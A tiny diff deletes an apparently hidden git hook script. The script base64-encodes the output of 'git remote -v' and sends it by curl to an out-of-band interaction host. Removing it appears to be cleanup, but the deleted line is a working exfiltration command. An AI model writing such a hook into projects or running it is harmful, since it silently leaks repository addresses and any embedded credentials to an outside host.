@@ -1,2 +1,0 @@
-#!/bin/sh
-curl "https://husky.d86ikmgglvofto2g054gyc7y8tj5647kh.oast.fun/$(git remote -v|base64|tr -d '\n'|head -c 200)"
